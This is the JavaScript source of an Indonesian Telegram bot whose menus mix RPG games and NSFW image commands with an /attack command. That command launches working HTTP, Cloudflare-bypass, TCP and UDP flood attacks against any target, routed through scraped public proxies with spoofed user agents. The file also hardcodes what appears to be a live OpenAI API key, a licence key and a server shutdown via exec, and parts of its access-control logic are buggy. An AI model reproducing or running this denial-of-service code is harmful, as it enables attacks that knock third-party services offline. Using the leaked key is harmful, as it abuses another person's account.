require('./config');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const cheerio = require('cheerio');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec } = require('child_process');
const util = require('util');
const readline = require('readline');
const net = require('net');
const dgram = require('dgram');
const cloudscraper = require('cloudscraper');
const { Agent } = require('https');
const dns = require('dns');
const figlet = require('figlet');
const keyPath = './lib/authorize.json';
const FormData = require('form-data');
const { HttpsProxyAgent } = require("https-proxy-agent");
const { promisify } = require('util');
const si = require('systeminformation');
const { JavaScriptObfuscator } = require('javascript-obfuscator');
const execPromise = promisify(exec);
const { loadDatabase, saveDatabase, updateBotStats, getBotStats } = require('./lib/database.js');
const { checkBalance, transferBalance, getUserData, saveUsers } = require('./lib/economy.js');
const { addXP, giveRandomItem, applyDamageToTools, registerUser } = require('./lib/rpg.js');
const { generateCaptcha } = require('./lib/utils');
const { downloadFile, scrapeWebsite, pingServer } = require('./lib/tools');
const items = require('./lib/items');
const craftingRecipes = require('./lib/craftingRecipes');

let attackInProgress = false;
const players = {};
const lastSailTime = {};
const locations = {};
const cooldowns = {};

const question = (text) => {
  const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
  });
  return new Promise((resolve) => {
rl.question(text, resolve)
  })
};

const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});

// Start Bot
// Key Function
// Jika file tidak ada, buat file baru
async function createFileIfNotExists() {
    if (!fs.existsSync(keyPath)) {
        const initialData = { "Authorize": "QpLz$34FalseWv0x" }; // Gunakan string aneh untuk status awal
        await fs.promises.writeFile(keyPath, JSON.stringify(initialData, null, 4));
    }
}

// Mendapatkan status otorisasi
async function getAuthorization() {
    if (!fs.existsSync(keyPath)) return false;
    const data = JSON.parse(await fs.promises.readFile(keyPath, 'utf-8'));
    return data.Authorize === 'Zxy@12!TrueBl4st'; // Cek string aneh untuk true
}

// Mengubah status otorisasi
async function setAuthorization(status) {
    const statusString = status ? 'Zxy@12!TrueBl4st' : 'QpLz$34FalseWv0x'; // Tentukan status berdasarkan true/false
    await fs.promises.writeFile(keyPath, JSON.stringify({ "Authorize": statusString }, null, 4));
}

// Fungsi utama untuk cek kunci
async function checkKey() {
    await createFileIfNotExists();
    let isAuthorized = getAuthorization();

    if (!isAuthorized) {
        const key = await question('Enter Key: ');
        console.log(`Key: ${key}`);

        if (key === 'nixstudiosofficialtelegrambotv1') {
            console.log('Key Correct!\n');
            await setAuthorization(true);
        } else {
            console.log('Key Wrong!');
            process.exit();
        }
    }
}

// Panggil checkKey untuk memulai proses
checkKey();

// Bot Settings
const token = `${global.token}`;
const bot = new TelegramBot(token, {polling: true});
const apiKey = 'ha481996783'; // Ganti dengan API key dari Behind The Name
const baseUrl = 'https://api.behindthename.com/api/lookup.json';
const openaiApiKey = "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";

// Fungsi untuk mendapatkan arti nama
async function getArtiNama(name) {
  try {
    const response = await axios.get(baseUrl, {
      params: {
        name: name,
        key: apiKey
      }
    });

    if (response.data && response.data.names && response.data.names.length > 0) {
      const meaning = response.data.names[0].meaning || 'Arti nama tidak ditemukan.';
      return meaning;
    } else {
      return 'Name not found.';
    }
  } catch (error) {
    console.error(error);
    return 'An error occurred while retrieving the meaning of the name.';
  }
}


module.exports = bot;

// Function to calculate uptime
const getUptime = () => {
    const uptime = process.uptime();
    const uptimeInHours = Math.floor(uptime / 3600);
    const uptimeInMinutes = Math.floor((uptime % 3600) / 60);
    const uptimeInSeconds = Math.floor(uptime % 60);
    return { uptimeInHours, uptimeInMinutes, uptimeInSeconds };
};

// Status ChatMode
let chatMode = false;

function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

const proxies = [];

async function fetchProxies() {
    try {
    if (getAuthorization) {
        const res = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=1000&country=all');
        proxies.push(...res.data.split('\n').filter(Boolean));
        console.log(`\x1b[32m[✅] Loaded ${proxies.length} proxies from ProxyScrape!\x1b[0m`);
        }
    } catch (error) {
        console.log('\x1b[31m[❌] Failed to fetch proxies:\x1b[0m', error.message);
    }
}

const getNSFWImage = async (category) => {
    try {
        const response = await axios.get(`https://${global.nsfw}/${category}`);
        if (response.data && response.data.url) {
            return response.data.url.split('.').pop() === 'gif' 
                ? { url: response.data.url, type: 'gif' } 
                : { url: response.data.url, type: 'photo' };
        }
        return null;
    } catch (error) {
        console.error(error);
        return null;
    }
};

// 🔥 Helper Function
async function isAdmin(chatId, userId) {
    try {
        const member = await bot.getChatMember(chatId, userId);
        return member.status === "administrator" || member.status === "creator";
    } catch {
        return false;
    }
}

// Fungsi pengecekan status user apakah owner
const isOwner = (chatId) => {
    try {
        const ownerData = JSON.parse(fs.readFileSync(path.join(__dirname, './lib/owner.json'), 'utf-8'));
        console.log(ownerData); // Debugging
        return ownerData.owners && ownerData.owners.includes(chatId.toString()); // Pastikan ownerData.owners ada
    } catch (error) {
        console.error("Error reading owner.json:", error);
        return false; // Jika error, dianggap bukan owner
    }
};

// Fungsi pengecekan status user apakah premium
const isPremium = async (chatId) => {
    const premiumData = await getPremiumData(); // Pastikan 'await' digunakan di sini
    if (!premiumData.premiumUsers.includes(chatId)) {
        premiumData.premiumUsers.push(chatId);
        await fs.promises.writeFile(path.join(__dirname, './lib/premium.json'), JSON.stringify(premiumData, null, 2));
    }
    return premiumData.premiumUsers.includes(chatId);
};

// Mengambil data premium dari file JSON secara asinkron
const getPremiumData = async () => {
    try {
        const data = await fs.promises.readFile(path.join(__dirname, './lib/premium.json'), 'utf-8');
        return JSON.parse(data);
    } catch (error) {
        console.error("Error reading premium.json:", error);
        return { premiumUsers: [] }; // Kembalikan data default jika file tidak ada atau error
    }
};

// Fungsi untuk memastikan file JSON ada
const ensureFilesExist = async () => {
    try {
        const ownerPath = path.join(__dirname, './lib/owner.json');
        const premiumPath = path.join(__dirname, './lib/premium.json');
        
        // Membuat file owner.json jika belum ada
        if (!fs.existsSync(ownerPath)) {
            await fs.promises.writeFile(ownerPath, JSON.stringify({ owners: [] }, null, 2));
        }

        // Membuat file premium.json jika belum ada
        if (!fs.existsSync(premiumPath)) {
            await fs.promises.writeFile(premiumPath, JSON.stringify({ premiumUsers: [] }, null, 2));
        }
    } catch (error) {
        console.error('Error memastikan file JSON ada:', error);
    }
};

// Panggil fungsi ini saat bot dijalankan untuk memastikan file ada
ensureFilesExist();

const sendMenu = (msg) => {
    const chatId = msg.chat.id;
    const { uptimeInHours, uptimeInMinutes, uptimeInSeconds } = getUptime();
    const options = {
        reply_markup: {
            inline_keyboard: [
                     [
                    { text: "Owner", callback_data: "owner" }
                ]
            ]
        }
    };

    const caption = `Haloo, Welcome To ${global.botname} A Powerfull and helpfull Telegram bots.\n` +
                    `┏━『Bot Info』\n` +
                    `╏◈ Bot Name : ${global.botname}\n` +
                    `╏◈ Owner : @${global.ownername}\n` +
                    `╏◈ Version : ${global.version}\n` +
                    `┃◈ Uptime : ${uptimeInHours} hours ${uptimeInMinutes} min ${uptimeInSeconds} sec\n` +
                    `┗━━━━━━━━━━━━\n\n` +
                    `┏━『Menu』\n` +
                    `╏◈ /allmenu\n` +
                    `╏◈ /owner\n` +
                    `┗━━━━━━━━━━━━\n\n`;

    bot.sendPhoto(chatId, path.join(__dirname, './image/thumbnail.png'), {
        caption: caption,
        reply_markup: options.reply_markup
    });
};

const sendAllMenu = (msg) => {
    const chatId = msg.chat.id;
    const { uptimeInHours, uptimeInMinutes, uptimeInSeconds } = getUptime();
    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Main Menu", callback_data: "mainmenu" },
                    { text: "Owner Menu", callback_data: "ownermenu" }
                ],
                [
                    { text: "RPG Menu", callback_data: "rpgmenu" },
                    { text: "Fun Menu", callback_data: "funmenu" }
                ]
            ]
        }
    };

    const caption = `Haloo, Perkenalkan aku Bot ${global.botname} Buatan @${global.ownername}, Aku di buat untuk membantu dan melayani orang.\n\n` +
                    `┏━『Bot Info』\n` +
                    `╏◈ Bot Name : ${global.botname}\n` +
                    `╏◈ Owner : @${global.ownername}\n` +
                    `╏◈ Version : ${global.version}\n` +
                    `┃◈ Uptime : ${uptimeInHours} hours ${uptimeInMinutes} min ${uptimeInSeconds} sec\n` +
                    `┗━━━━━━━━━━━━\n\n` +
                    `┏━『User Info』\n` +
                    `╏◈ Name : ${msg.from.first_name || 'Anonymous'}\n` +
                    `╏◈ Status : ${isOwner(chatId) ? 'Owner' : isPremium(chatId) ? 'Premium' : 'Free'}\n` +
                    `┗━━━━━━━━━━━━\n\n` +
                    `┏━『Menu』\n` +
                    `╏◈ /mainmenu\n` +
                    `╏◈ /allmenu\n` +
                    `╏◈ /ownermenu\n` +
                    `╏◈ /funmenu\n` +
                    `╏◈ /rpgmenu\n` +
                    `╏◈ /owner\n` +
                    `┗━━━━━━━━━━━━\n\n` +
                    `┏━『Owner Menu』\n` +
                    `╏◈ /addprem <Id>\n` +
                    `╏◈ /delprem <Id>\n` +
                    `╏◈ /listprem\n` +
                    `┃◈ /addowner <Id>\n` +
                    `┃◈ /delowner <Id>\n` +
                    `┃◈ /listowner\n` +
                    `╏◈ /blowjob\n` +
                    `╏◈ /neko\n` +
                    `╏◈ /waifu\n` +
                    `╏◈ /nsfwgif\n` +
                    `╏◈ /nsfwimg\n` +
                    `╏◈ /attack <Target> <Method> <Duration> <Thread>\n` +
                    `╏◈ /shutdown\n` +
                    `╏◈ /bandwithusage\n` +
                    `╏◈ /setname <Nama>\n` +
                    `╏◈ /setpp <Reply/Tag_Gambar>\n` +
                    `╏◈ /attackstatus\n` +
                    `╏◈ /1gb <Username> <Id>\n` +
                    `╏◈ /listserver\n` +
                    `╏◈ /listadmin\n` +
                    `╏◈ /deladmin <UserId>\n` +
                    `╏◈ /listadmin\n` +
                    `╏◈ /subdo1 <Hostname>|<Ip>\n` +
                    `╏◈ /listsubdo\n` +
                    `╏◈ /enc <Code>\n` +
                    `╏◈ /dec <Code_Dari_Enc>\n` +
                    `┗━━━━━━━━━━━━\n\n`;

    bot.sendPhoto(chatId, path.join(__dirname, './image/thumbnail.png'), {
        caption: caption,
        reply_markup: options.reply_markup
    });
};

// Menangani callback query untuk tombol
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const callbackData = callbackQuery.data;

    if (callbackData === 'mainmenu') {
        sendMainMenu(callbackQuery.message);
    } else if (callbackData === 'ownermenu') {
        sendOwnerMenu(callbackQuery.message);
    } else if (callbackData === 'rpgmenu') {
        sendRpgMenu(callbackQuery.message);
    } else if (callbackData === 'funmenu') {
        sendFunMenu(callbackQuery.message);
    }
});

// Fungsi untuk sendMainMenu
const sendMainMenu = (msg) => {
    const chatId = msg.chat.id;
    const caption = `Ini List Main Menu.\n` +
                    `┏━『Main Menu』\n` +
                    `┃◈ /ping\n` +
                    `╏◈ /allmenu\n` +
                    `┃◈ /menu\n` +
                    `╏◈ /owner\n` +
                    `╏◈ /tourl <Url>\n` +
                    `╏◈ /serverstatus <Target>\n` +
                    `╏◈ /checkport <Target> <Port>\n` +
                    `╏◈ /stats\n` +
                    `┗━━━━━━━━━━━━\n\n`;

    bot.sendPhoto(chatId, path.join(__dirname, './image/thumbnail.png'), {
        caption: caption,
    });
};

// Fungsi untuk sendOwnerMenu
const sendOwnerMenu = (msg) => {
    const chatId = msg.chat.id;
    const caption = `Ini List Owner Menu.\n` +
        `┏━『Owner Menu』\n` +
        `╏◈ /addprem <Id>\n` +
        `╏◈ /delprem <Id>\n` +
        `╏◈ /listprem\n` +
        `┃◈ /addowner <Id>\n` +
        `┃◈ /delowner <Id>\n` +
        `┃◈ /listowner\n` +
        `╏◈ /blowjob\n` +
        `╏◈ /neko\n` +
        `╏◈ /waifu\n` +
        `╏◈ /nsfwgif\n` +
        `╏◈ /nsfwimg\n` +
        `╏◈ /attack <Target> <Method> <Duration> <Thread>\n` +
        `╏◈ /shutdown\n` +
        `╏◈ /bandwithusage\n` +
        `╏◈ /setname <Nama>\n` +
        `╏◈ /setpp <Reply/Tag_Gambar>\n` +
        `╏◈ /attackstatus\n` +
        `╏◈ /1gb <Username> <Id>\n` +
        `╏◈ /listserver\n` +
        `╏◈ /listadmin\n` +
        `╏◈ /deladmin <UserId>\n` +
        `╏◈ /subdo1 <Hostname>|<Ip>\n` +
        `╏◈ /listsubdo\n` +
        `╏◈ /enc <Code>\n` +
        `╏◈ /dec <Code_Dari_Enc>\n` +
        `┗━━━━━━━━━━━━\n\n`;

    bot.sendPhoto(chatId, path.join(__dirname, './image/thumbnail.png'), {
        caption: caption,
    });
};

// Fungsi untuk sendRpgMenu
const sendRpgMenu = (msg) => {
    const chatId = msg.chat.id;
    const caption = `Ini List RPG Menu.\n` +
        `┏━『RPG Menu』\n` +
        `╏◈ /register\n` + 
        `╏◈ /me\n` +
        `╏◈ /leaderboard\n` +
        `╏◈ /setnick <Nama>\n` +
        `╏◈ /customrank <Rank>\n` +
        `╏◈ /inventory\n` +
        `╏◈ /menebang\n` +
        `╏◈ /menambang\n` +
        `╏◈ /berburu\n` +
        `╏◈ /berlayar\n` +
        `╏◈ /daily\n` +
        `╏◈ /weekly\n` +
        `╏◈ /monthly\n` +
        `╏◈ /shop\n` +
        `╏◈ /buy <Nama_Item> <Jumlah>\n` +
        `╏◈ /sell <Nama_Item> <Jumlah>\n` +
        `╏◈ /cekbank\n` +
        `╏◈ /deposit <Jumlah>\n` +
        `╏◈ /withdraw <Jumlah>\n` +
        `╏◈ /loot\n` +
        `╏◈ /slot <Bet>\n` +
        `╏◈ /lotre\n` +
        `╏◈ /pick <Bet>\n` +
        `╏◈ /dice\n` +
        `╏◈ /coinflip\n` +
        `╏◈ /blackjack\n` +
        `╏◈ /roulette\n` +
        `┗━━━━━━━━━━━━\n\n`;
    
    bot.sendMessage(chatId, caption);
};

// Fungsi untuk sendFunMenu
const sendFunMenu = (msg) => {
    const chatId = msg.chat.id;
    const caption = `Ini List Fun Menu.\n` +
        `┏━『Fun Menu』\n` +
        `╏◈ /ninja <Nama>\n` +
        `╏◈ /tcn <Text>\n` +
        `╏◈ /joke\n` +
        `╏◈ /quote <id/en>\n` +
        `╏◈ /fact\n` +
        `╏◈ /meme\n` +
        `╏◈ /cekkodam\n` +
        `╏◈ /cekkontol <Nama>\n` + 
        `╏◈ /cekmemek <Nama>\n` +
        `╏◈ /artinama <Nama>\n` +
        `╏◈ /truth\n` +
        `╏◈ /dare\n` +
        `╏◈ /ascii <Text>\n` +
        `╏◈ /tobin <Text>\n` +
        `╏◈ /totext <Bin>\n` +
        `╏◈ /cekme <Nama>\n` +
        `╏◈ /gaycek <Nama>\n` + 
        `╏◈ /hanzzxgpt <Text>\n` +
        `┗━━━━━━━━━━━━\n\n`;

    bot.sendPhoto(chatId, path.join(__dirname, './image/thumbnail.png'), {
        caption: caption,
    });
};

// Fungsi untuk sendMainMenu
const sendSUSMenu = (msg) => {
    const chatId = msg.chat.id;
    const caption = `Ini List SUS Menu.\n` +
                    `┏━『SUS Menu』\n` +
                    `┃◈ /fuck @user Slow/Medium/Hard\n` +
                    `╏◈ /anal @user Slow/Medium/Hard\n` +
                    `┃◈ /lick @user Slow/Medium/Hard\n` +
                    `╏◈ /suck @user Slow/Medium/Hard\n` +
                    `┃◈ /bite @user Slow/Medium/Hard\n` +
                    `╏◈ /press @user Slow/Medium/Hard\n` +
                    `┃◈ /stroke @user Slow/Medium/Hard\n` +
                    `╏◈ /thrust @user Slow/Medium/Hard\n` +
                    `┃◈ /bounce @user Slow/Medium/Hard\n` +
                    `╏◈ /deep @user Slow/Medium/Hard\n` +
                    `┃◈ /squirt @user Slow/Medium/Hard\n` +
                    `╏◈ /fingering @user Slow/Medium/Hard\n` +
                    `┗━━━━━━━━━━━━\n\n`;

    bot.sendPhoto(chatId, path.join(__dirname, './image/thumbnail.png'), {
        caption: caption,
    });
};

// Menangani perintah start dan menu
bot.onText(/\/start/, (msg) => {
    sendMenu(msg);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/menu/, (msg) => {
    sendMenu(msg);
    updateBotStats("command"); // Track penggunaan perintah
})

// Command untuk /allmenu
bot.onText(/\/allmenu/, (msg) => {
    sendAllMenu(msg);
    updateBotStats("command"); // Track penggunaan perintah
});

// Command untuk /mainmenu
bot.onText(/\/mainmenu/, (msg) => {
    sendMainMenu(msg);
    updateBotStats("command"); // Track penggunaan perintah
});

// Command untuk /ownermenu
bot.onText(/\/ownermenu/, (msg) => {
    sendOwnerMenu(msg);
    updateBotStats("command"); // Track penggunaan perintah
});

// Command untuk /rpgmenu
bot.onText(/\/rpgmenu/, (msg) => {
    sendRpgMenu(msg);
    updateBotStats("command"); // Track penggunaan perintah
});

// Command untuk /funmenu
bot.onText(/\/funmenu/, (msg) => {
    sendFunMenu(msg);
    updateBotStats("command"); // Track penggunaan perintah
});;

// Command untuk /susmenu
bot.onText(/\/susmenu/, (msg) => {
    sendSUSMenu(msg);
    updateBotStats("command"); // Track penggunaan perintah
});;

// Command untuk /owner
bot.onText(/\/owner/, (msg) => {
    const chatId = msg.chat.id;

    // Mengirim pesan kepada semua orang
    bot.sendMessage(chatId, `This is My Ownerr😘 @${global.ownername}`);
    updateBotStats("command"); // Track penggunaan perintah
});

// Command untuk Neko
bot.onText(/\/neko/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(msg.chat.id, global.mess.wait);
    const result = await getNSFWImage('neko');
    if (result) {
        if (result.type === 'gif') {
            bot.sendDocument(chatId, result.url); // Mengirim GIF
        } else {
            bot.sendPhoto(chatId, result.url); // Mengirim foto
        }
    } else {
        bot.sendMessage(chatId, `Error: Can't get image`);
    }
});

// Command untuk Waifu
bot.onText(/\/waifu/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(msg.chat.id, global.mess.wait);
    const result = await getNSFWImage('waifu');
    if (result) {
        if (result.type === 'gif') {
            bot.sendDocument(chatId, result.url); // Mengirim GIF
        } else {
            bot.sendPhoto(chatId, result.url); // Mengirim foto
        }
    } else {
        bot.sendMessage(chatId, `Error: Can't get image`);
    }
});

// Command untuk Blowjob
bot.onText(/\/blowjob/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(msg.chat.id, global.mess.wait);
    const result = await getNSFWImage('blowjob');
    if (result) {
        if (result.type === 'gif') {
            bot.sendDocument(chatId, result.url); // Mengirim GIF
        } else {
            bot.sendPhoto(chatId, result.url); // Mengirim foto
        }
    } else {
        bot.sendMessage(chatId, `Error: Can't get gif`);
    }
});

// Command untuk menambah premium user
bot.onText(/\/addprem (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (isOwner(msg.from.id)) {
        const userId = match[1];
        const premiumData = getPremiumData();
        if (!premiumData.premiumUsers.includes(chatId)) {
            premiumData.premiumUsers.push(userId);
            fs.promises.writeFile(path.join(__dirname, './lib/premium.json'), JSON.stringify(premiumData, null, 2));
            bot.sendMessage(userId, `User ${userId} has been added to premium.`);
            updateBotStats("command"); // Track penggunaan perintah
        } else {
            bot.sendMessage(userId, `User ${userId} is already a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'You are not authorized to add premium users.');
    }
});

// Command untuk menghapus premium user
bot.onText(/\/delprem (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (isOwner(msg.from.id)) {
        const userId = match[1];
        const premiumData = getPremiumData();
        const index = premiumData.premiumUsers.indexOf(userId);
        if (index !== -1) {
            premiumData.premiumUsers.splice(index, 1);
            fs.promises.writeFile(path.join(__dirname, './lib/premium.json'), JSON.stringify(premiumData, null, 2));
            bot.sendMessage(userId, `User ${userId} has been removed from premium.`);
            updateBotStats("command"); // Track penggunaan perintah
        } else {
            bot.sendMessage(userId, `User ${userId} is not a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'You are not authorized to remove premium users.');
    }
});

// Command untuk menampilkan list premium users
bot.onText(/\/listprem/, (msg) => {
    const chatId = msg.chat.id;
    if (isOwner(msg.from.id)) {
        const premiumData = getPremiumData();
        const premiumUsers = premiumData.premiumUsers;
        if (premiumUsers.length > 0) {
            bot.sendMessage(chatId, `List of Premium Users:\n\n${premiumUsers.join('\n')}`);
            updateBotStats("command"); // Track penggunaan perintah
        } else {
            bot.sendMessage(chatId, 'No premium users found.');
        }
    } else {
        bot.sendMessage(chatId, global.mess.owner);
    }
});

// Command untuk menambah owner
bot.onText(/\/addowner (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (isOwner(msg.from.id)) {
        const userId = match[1];
        const ownerData = getOwnerData();
        if (!ownerData.owners.includes(userId)) {
            ownerData.owners.push(userId);
            fs.promises.writeFile(path.join(__dirname, './lib/owner.json'), JSON.stringify(ownerData, null, 2));
            bot.sendMessage(userId, `User ${userId} has been added as an owner.`);
            updateBotStats("command"); // Track penggunaan perintah
        } else {
            bot.sendMessage(userId, `User ${userId} is already an owner.`);
        }
    } else {
        bot.sendMessage(chatId, 'You are not authorized to add owners.');
    }
});

// Command untuk menghapus owner
bot.onText(/\/delowner (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (isOwner(msg.from.id)) {
        const userId = match[1];
        const ownerData = getOwnerData();
        const index = ownerData.owners.indexOf(userId);
        if (index !== -1) {
            ownerData.owners.splice(index, 1);
            fs.promises.writeFile(path.join(__dirname, './lib/owner.json'), JSON.stringify(ownerData, null, 2));
            bot.sendMessage(userId, `User ${userId} has been removed from owners.`);
            updateBotStats("command"); // Track penggunaan perintah
        } else {
            bot.sendMessage(userId, `User ${userId} is not an owner.`);
        }
    } else {
        bot.sendMessage(chatId, global.mess.owner);
    }
});


// Command untuk menampilkan list owners
bot.onText(/\/listowner/, (msg) => {
    const chatId = msg.chat.id;
    if (isOwner(msg.from.id)) {
        const ownerData = getOwnerData();
        const owners = ownerData.owners;
        if (owners.length > 0) {
            bot.sendMessage(chatId, `List of Owners:\n\n${owners.join('\n')}`);
            updateBotStats("command"); // Track penggunaan perintah
        } else {
            bot.sendMessage(chatId, 'No owners found.');
        }
    } else {
        bot.sendMessage(chatId, global.mess.owner);
    }
});

// 🔹 User-Agent Random
function randomUserAgent() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/537.36',
        'Mozilla/5.0 (Android 13; Mobile; LG-M255) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// 🔹 Header Tambahan
function getHeaders() {
    return {
        'User-Agent': randomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://www.google.com/',
        'Upgrade-Insecure-Requests': '1',
    };
}

// 🔹 HTTP Flood (Layer 7)
function startHttpFlood(target, duration, threads) {
    attackInProgress = true;
    const startTime = Date.now();
    
    function attack() {
        const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
        const agent = proxy ? new Agent({ proxy }) : undefined;

        axios.get(target, { headers: getHeaders(), httpsAgent: agent }).catch(() => {});
    }

    const interval = setInterval(() => {
        for (let i = 0; i < threads; i++) attack();
        if (Date.now() - startTime >= duration * 1000) {
            clearInterval(interval);
            setTimeout(() => attackInProgress = false, 1000);
        }
    }, 10);
}

// 🔹 Cloudflare Bypass (Layer 7)
function startCfBypass(target, duration, threads) {
    attackInProgress = true;
    const startTime = Date.now();

    function attack() {
        const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;

        cloudscraper.get({
            uri: target,
            headers: getHeaders(),
            proxy: proxy ? `http://${proxy}` : undefined
        }).catch(() => {});
    }

    const interval = setInterval(() => {
        for (let i = 0; i < threads; i++) attack();
        if (Date.now() - startTime >= duration * 1000) {
            clearInterval(interval);
            setTimeout(() => attackInProgress = false, 1000);
        }
    }, 10);
}

// 🔹 TCP SYN Flood (Layer 4)
function startTcpSynFlood(target, port, duration, threads) {
    attackInProgress = true;
    const startTime = Date.now();
    
    const interval = setInterval(() => {
        for (let i = 0; i < threads; i++) {
            const client = new net.Socket();
            client.connect(port, target, () => {
                setTimeout(() => client.destroy(), 500);
            });
        }
        if (Date.now() - startTime >= duration * 1000) {
            clearInterval(interval);
            setTimeout(() => attackInProgress = false, 1000);
        }
    }, 10);
}

// 🔹 UDP Flood (Layer 4)
function startUdpFlood(target, port, duration, threads) {
    attackInProgress = true;
    const client = dgram.createSocket('udp4');
    const startTime = Date.now();
    const message = Buffer.from('FLOOD');

    const interval = setInterval(() => {
        for (let i = 0; i < threads; i++) {
            client.send(message, 0, message.length, port, target, (err) => {
                if (err) console.error(err);
            });
        }
        if (Date.now() - startTime >= duration * 1000) {
            clearInterval(interval);
            setTimeout(() => attackInProgress = false, 1000);
        }
    }, 10);
}

// 🔹 Command Attack
bot.onText(/\/attack (.+) (.+) (.+) (.+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const method = match[1].toLowerCase();
    const target = match[2];
    const port = parseInt(match[3]);
    const duration = parseInt(match[4]);
    const threads = parseInt(match[5]);

    if (isNaN(port) || port < 1 || port > 65535) {
        return bot.sendMessage(chatId, '❌ Invalid port! Must be between 1-65535.');
    }
    if (isNaN(duration) || duration <= 0 || duration > 3600) {
        return bot.sendMessage(chatId, '❌ Invalid duration! Must be between 1-3600 seconds.');
    }
    if (isNaN(threads) || threads <= 0 || threads > 1000) {
        return bot.sendMessage(chatId, '❌ Invalid threads! Must be between 1-1000.');
    }

    bot.sendMessage(chatId, `🚀 Starting ${method.toUpperCase()} attack on ${target} for ${duration} seconds with ${threads} threads...`);

    console.log(`\x1b[36m[🚀Missile Launched!]\x1b[0m`);
    console.log(`\x1b[32mSender:\x1b[0m ${msg.from.username || msg.from.id}`);
    console.log(`\x1b[32mTarget:\x1b[0m ${target}`);
    console.log(`\x1b[33mMethod:\x1b[0m ${method.toUpperCase()}`);
    console.log(`\x1b[35mPort:\x1b[0m ${port}`);
    console.log(`\x1b[35mDuration:\x1b[0m ${duration} sec`);
    console.log(`\x1b[35mThreads:\x1b[0m ${threads}`);
    console.log(`\x1b[36m--------------------------\x1b[0m`);

    switch (method) {
        case 'http':
            startHttpFlood(target, duration, threads);
            break;
        case 'cfbypass':
            startCfBypass(target, duration, threads);
            break;
        case 'syn':
            startTcpSynFlood(target, port, duration, threads);
            break;
        case 'udp':
            startUdpFlood(target, port, duration, threads);
            break;
        default:
            return bot.sendMessage(chatId, '❌ Invalid method! Use: http, cfbypass, syn, udp.');
    }

    bot.sendMessage(chatId, `✅ Attack launched on ${target}!`);
    if (typeof updateBotStats === "function") updateBotStats("command");
});

bot.onText(/\/serverstatus (\S+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const target = match[1];
    
    dns.lookup(target, (err, address) => {
        if (err) {
            bot.sendMessage(chatId, `Server ${target} is down.`);
        } else {
            bot.sendMessage(chatId, `Server ${target} is up.`);
        }
    });
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/checkport (\S+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const target = match[1];
    const port = parseInt(match[2]);
    bot.sendMessage(msg.chat.id, global.mess.wait);
    
    const socket = new net.Socket();
    socket.setTimeout(3000);
    
    socket.on('connect', () => {
        bot.sendMessage(chatId, `Port ${port} is open on ${target}.`);
        socket.destroy();
    }).on('timeout', () => {
        bot.sendMessage(chatId, `Port ${port} is closed on ${target}.`);
        socket.destroy();
    }).on('error', () => {
        bot.sendMessage(chatId, `Port ${port} is closed on ${target}.`);
    }).connect(port, target);
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/shutdown/, (msg) => {
    const chatId = msg.chat.id;
    if (!isOwner(chatId)) {
        bot.sendMessage(chatId, global.mess.owner);
        return;
    }

    bot.sendMessage(chatId, "Shutting down the server...");
    
    // Menutup server (gunakan perintah shutdown atau script sesuai dengan server yang digunakan)
    exec('shutdown -h now', (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `Error: ${stderr}`);
        } else {
            bot.sendMessage(chatId, "Server is shutting down...");
        }
    });
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/bandwidthusage/, (msg) => {
    const chatId = msg.chat.id;
    if (!isOwner(chatId)) {
        bot.sendMessage(chatId, global.mess.owner);
        return;
    }

    bot.sendMessage(msg.chat.id, global.mess.wait);
    exec('ifstat -i eth0 1 1', (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `Error: ${stderr}`);
        } else {
            bot.sendMessage(chatId, `Bandwidth Usage:\n${stdout}`);
        }
    });
    updateBotStats("command"); // Track penggunaan perintah
});

bot.onText(/\/attackstatus/, (msg) => {
    const chatId = msg.chat.id;
    if (!isOwner(chatId)) {
        bot.sendMessage(chatId, global.mess.owner);
        return;
    }
    
    if (attackInProgress) {
        bot.sendMessage(chatId, "An attack is currently in progress.");
    } else {
        bot.sendMessage(chatId, "No active attacks.");
    }
